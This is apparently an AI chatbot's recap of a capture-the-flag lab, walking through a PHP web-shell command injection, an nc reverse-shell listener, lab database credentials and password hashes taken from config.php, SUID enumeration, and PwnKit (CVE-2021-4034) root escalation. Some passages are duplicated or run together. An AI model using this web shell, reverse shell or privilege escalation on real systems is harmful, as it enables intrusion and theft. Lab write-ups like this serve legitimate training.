@@ -1,0 +1,234 @@
+You’ve just found:
+
+pkexec version 0.105
+💀 Why this is HUGE
+
+This version is vulnerable to:
+
+👉 CVE-2021-4034
+
+Also called:
+👉 PwnKit
+
+You’ve just found:
+
+pkexec version 0.105
+💀 Why this is HUGE
+
+This version is vulnerable to:
+
+👉 CVE-2021-4034
+
+Also called:
+👉 PwnKit
+
+
+  www-data
+   ↓
+enumeration
+   ↓
+pkexec vuln found
+   ↓
+exploit PwnKit
+   ↓
+ROOT
+What’s happening (important)
+
+You’re exploiting:
+
+👉 CVE-2021-4034
+
+Mechanism:
+
+pkexec loads malicious gconv module
+executes your code as root
+spawns shell
+
+😈 FINAL RESULT
+
+You successfully:
+
+www-data → pkexec exploit → ROOT😈 FINAL RESULT
+
+You successfully:
+
+www-data → pkexec exploit → ROOT
+
+
+
+
+🧠 🔐 Full Attack Chain (What You Did)
+1️⃣ Initial Access – Remote Code Execution (RCE)
+You discovered a vulnerable PHP file:
+<?php system($_GET['cmd']); ?>
+
+👉 This gave you:
+
+Ability to execute system commands via browser
+Example:
+shell.php?cmd=whoami
+2️⃣ Reverse Shell (Shell Upgrade)
+
+You upgraded from basic command execution to a full shell:
+
+nc -lvnp 1234   (on Kali)
+
+Target connected back → you got:
+
+www-data@napping
+
+👉 This is:
+
+Low-privilege web user access
+
+3️⃣ Sensitive Data Exposure (Config Leak)
+
+You found:
+
+/var/www/html/config.php
+
+Inside:
+
+DB_USERNAME = adrian
+DB_PASSWORD = P@sswr0d456
+
+👉 Vulnerability:
+
+Sensitive Information Disclosure
+
+4️⃣ Database Access (Lateral Movement)
+
+You used credentials:
+
+mysql -u adrian -p
+
+Then:
+
+SHOW DATABASES;
+USE website;
+SHOW TABLES;
+SELECT * FROM users;
+
+👉 You extracted:
+
+usernames
+bcrypt password hashes
+5️⃣ Credential Harvesting
+
+From DB:
+
+admin → $2y$10$...
+hello → $2y$10$...
+
+👉 These are:
+
+bcrypt hashed passwords
+
+⚠️ Important Learning
+DB users ≠ system users
+But still valuable for:
+reuse attacks
+further enumeration
+6️⃣ Privilege Escalation Enumeration
+
+You checked:
+
+find / -perm -4000 2>/dev/null
+
+Found:
+
+/usr/bin/pkexec
+💀 7️⃣ Critical Vulnerability Found
+
+👉 CVE-2021-4034
+
+Also known as:
+👉 PwnKit
+
+🧠 About the Vulnerability
+Affects: pkexec (Polkit)
+Cause: improper handling of environment variables
+Impact: Local Privilege Escalation to ROOT
+⚡ Vulnerable Version
+
+You confirmed:
+
+pkexec --version
+→ 0.105
+
+👉 Vulnerable ✔
+
+8️⃣ Exploitation (PwnKit)
+
+You:
+
+created malicious gconv module (evil.so)
+crafted environment variables
+executed:
+./exploit
+💥 Result
+
+You got:
+
+root shell
+
+Even though initially:
+
+whoami: not found
+
+👉 Because:
+
+PATH not set
+
+After fixing:
+
+export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin
+🏆 Final Privilege Level
+root
+📊 Attack Flow Summary
+RCE (web shell)
+   ↓
+Reverse shell (www-data)
+   ↓
+Read config.php
+   ↓
+Extract DB credentials
+   ↓
+Access database
+   ↓
+Dump users
+   ↓
+Enumerate system
+   ↓
+Find pkexec
+   ↓
+Exploit CVE-2021-4034
+   ↓
+ROOT
+🔥 Vulnerabilities You Exploited
+1️⃣ Remote Code Execution
+PHP system() misuse
+2️⃣ Sensitive Data Exposure
+Credentials stored in plaintext (config.php)
+3️⃣ Weak Security Practices
+DB accessible from system
+4️⃣ Privilege Escalation
+CVE-2021-4034 (PwnKit)
+🧠 Interview Answer (🔥 USE THIS)
+
+If asked:
+
+👉 “How did you gain root?”
+
+Say:
+
+“I gained initial access through a command injection vulnerability in a PHP application, upgraded to a reverse shell, extracted database credentials from a configuration file, accessed the database, and during enumeration discovered a vulnerable pkexec binary (CVE-2021-4034). I exploited it using a crafted gconv module to achieve root privileges.”
+
+😈 What You Just Demonstrated
+Web exploitation
+Linux privilege escalation
+Credential extraction
+Enumeration skills
+Exploit development
+
+👉 This is real pentester workflow
